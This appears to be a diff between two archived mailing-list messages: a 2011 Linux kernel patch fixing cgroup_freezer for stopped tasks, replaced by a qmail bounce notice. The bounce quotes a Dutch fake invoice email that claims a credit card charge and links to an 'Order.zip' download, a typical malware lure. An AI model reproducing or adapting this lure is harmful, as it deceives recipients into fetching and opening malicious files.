@@ -1,7 +1,7 @@
-From: Michal Hocko <mhocko-AlSwsSmVLrQ@public.gmane.org>
-Subject: [PATCH] cgroup_freezer: fix freezing groups with stopped tasks
-Date: Wed, 16 Nov 2011 22:50:34 +0100
-Message-ID: <1321480234-29241-1-git-send-email-mhocko__45789.3875580796$1321480273$gmane$org@suse.cz>
+From: MAILER-DAEMON-jWaDipeI4z1FKHX/5f8+YWZHpeb/A1Y/@public.gmane.org
+Subject: failure notice
+Date: 17 Nov 2011 02:23:01 -0000
+Message-ID: <20111117022140.A200A3F0@mail.linuxfoundation.org>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -15,84 +15,68 @@ List-Subscribe: <https://lists.linuxfoundation.org/mailman/listinfo/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=subscribe>
 Sender: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-To: linux-kernel-u79uwXL29TY76Z2rM5mHXA@public.gmane.org
-Cc: Tejun Heo <htejun-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>, containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org, Tomasz Buchert <tomasz.buchert-MZpvjPyXg2s@public.gmane.org>, cgroups-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, Andrew Morton <akpm-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>, Paul Menage <paul-inf54ven1CmVyaH7bEyXVA@public.gmane.org>
+To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
-2d3cbf8b (cgroup_freezer: update_freezer_state() does incorrect state
-transitions) removed is_task_frozen_enough and replaced it with a simple
-frozen call. This, however, breaks freezing for a group with stopped tasks
-because those cannot be frozen and so the group remains in CGROUP_FREEZING
-state (update_if_frozen doesn't count stopped tasks) and never reaches
-CGROUP_FROZEN.
+Hi. This is the qmail-send program at qmail22.zonnet.nl.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
+---------------------------------------------------------------------
+Het volgende bericht dat u stuurde aan deze gebruiker is niet aangekomen.
+De meest voorkomende redenen zijn:
+- het verkeerd intypen van het e-mailadres of het e-mailadres bestaat niet.
+- de mailbox van de ontvangende gebruiker is vol waardoor er geen e-mail meer wo
+rdt geaccepteerd.
+- het e-mailbericht stond in de wachtrij en kon in de afgelopen 3 dagen niet wor
+den afgeleverd.
+--------------------------------------------------------------------
+The following email that you sent to this user has not been received.
+The most occuring reasons are:
+- wrongly typed e-mailaddress or the e-mailaddress doesn't exist.
+- the e-mailbox of the receiving user is full and therefore the e-mail won't be
+accepted.
+- the e-mailmessage was in queue and couldn't be delivered in the past 3 days.
+---------------------------------------------------------------------
 
-Let's add is_task_frozen_enough back and use it at the original locations
-(update_if_frozen and try_to_freeze_cgroup). Semantically we consider
-stopped tasks as frozen enough so we should consider both cases when
-testing frozen tasks.
+<k.v.klaveren-RSh1/+X/PmFmR6Xm/wNWPw@public.gmane.org>:
+The users mailfolder is over the allowed quota (size).
 
-Testcase:
-mkdir /dev/freezer
-mount -t cgroup -o freezer none /dev/freezer
-mkdir /dev/freezer/foo
-sleep 1h &
-pid=$!
-kill -STOP $pid
-echo $pid > /dev/freezer/foo/tasks
-echo FROZEN > /dev/freezer/foo/freezer.state
-while true
-do
-        cat /dev/freezer/foo/freezer.state
-        [ "`cat /dev/freezer/foo/freezer.state`" = "FROZEN" ] && break
-        sleep 1
-done
-echo OK
+--- Below this line is a copy of the message.
 
-Signed-off-by: Michal Hocko <mhocko-AlSwsSmVLrQ@public.gmane.org>
-Cc: Tomasz Buchert <tomasz.buchert-MZpvjPyXg2s@public.gmane.org>
-Cc: Paul Menage <paul-inf54ven1CmVyaH7bEyXVA@public.gmane.org>
-Cc: Li Zefan <lizf-BthXqXjhjHXQFUHtdCDX3A@public.gmane.org>
-Cc: Andrew Morton <akpm-de/tnXTf+JLsfHDXvbKv3WD2FQJk+8+b@public.gmane.org>
-Cc: Tejun Heo <htejun-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
----
- kernel/cgroup_freezer.c |   11 +++++++++--
- 1 files changed, 9 insertions(+), 2 deletions(-)
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: (qmail 4007 invoked by uid 0); 17 Nov 2011 02:23:00 -0000
+Received: from unknown ([10.170.1.116])
+          (envelope-sender <>)
+          by qmail22.zonnet.nl (qmail-ldap-1.03) with QMQP
+          for < >; 17 Nov 2011 02:23:00 -0000
+Delivered-To: CLUSTERHOST mail1.versatel.nl k.v.klaveren-RSh1/+X/PmFmR6Xm/wNWPw@public.gmane.org
+Received: (qmail 1746 invoked by uid 0); 17 Nov 2011 02:21:46 -0000
+Received: from static.99.74.4.46.clients.your-server.de (HELO myoroclean.domain.de) ([46.4.74.99])
+          (envelope-sender <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+          by mail1.versatel.nl (qmail-ldap-1.03) with SMTP
+          for < >; 17 Nov 2011 02:21:46 -0000
+Received: from [46.4.74.99] by myoroclean.domain.de id GGehiPSW88xNb; Thu, 17 Nov 2011 03:32:33 +0100
+Message-ID: <009201cca4d1$27d08980$0200a8c0-lsYetlmOafdBoFUHns3esWfrygkm6VTR@public.gmane.org>
+From: "Index" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <k.v.klaveren-RSh1/+X/PmFmR6Xm/wNWPw@public.gmane.org>
+Subject: Factuur | 459482-079672.
+Date: Thu, 17 Nov 2011 03:32:33 +0100
+MIME-Version: 1.0
+Content-Type: text/plain;
+	charset="windows-1252"
+Content-Transfer-Encoding: 8bit
 
-diff --git a/kernel/cgroup_freezer.c b/kernel/cgroup_freezer.c
-index 5e828a2..4d073dc 100644
---- a/kernel/cgroup_freezer.c
-+++ b/kernel/cgroup_freezer.c
-@@ -153,6 +153,13 @@ static void freezer_destroy(struct cgroup_subsys *ss,
- 	kfree(cgroup_freezer(cgroup));
- }
- 
-+/* Task is frozen or will freeze immediately when next it gets woken */
-+static bool is_task_frozen_enough(struct task_struct *task)
-+{
-+	return frozen(task) ||
-+		(task_is_stopped_or_traced(task) && freezing(task));
-+}
-+
- /*
-  * The call to cgroup_lock() in the freezer.state write method prevents
-  * a write to that file racing against an attach, and hence the
-@@ -231,7 +238,7 @@ static void update_if_frozen(struct cgroup *cgroup,
- 	cgroup_iter_start(cgroup, &it);
- 	while ((task = cgroup_iter_next(cgroup, &it))) {
- 		ntotal++;
--		if (frozen(task))
-+		if (is_task_frozen_enough(task))
- 			nfrozen++;
- 	}
- 
-@@ -284,7 +291,7 @@ static int try_to_freeze_cgroup(struct cgroup *cgroup, struct freezer *freezer)
- 	while ((task = cgroup_iter_next(cgroup, &it))) {
- 		if (!freeze_task(task, true))
- 			continue;
--		if (frozen(task))
-+		if (is_task_frozen_enough(task))
- 			continue;
- 		if (!freezing(task) && !freezer_should_skip(task))
- 			num_cant_freeze_now++;
--- 
-1.7.7.1
+
+
+
+Hello, 
+Dank u voor de bestelling,
+id: 967302.
+
+Uw creditcard wordt in rekening gebracht voor 687 euro.
+
+Informatie over de bestelling en levering vinden op:
+http://damianofrutta.it/clientedown/Order.zip?id:8891Generation_user=k.v.klaveren-RSh1/+X/PmFmR6Xm/wNWPw@public.gmane.org
+
+==
+Tel./Fax.: +31 (20) 951 09 10.
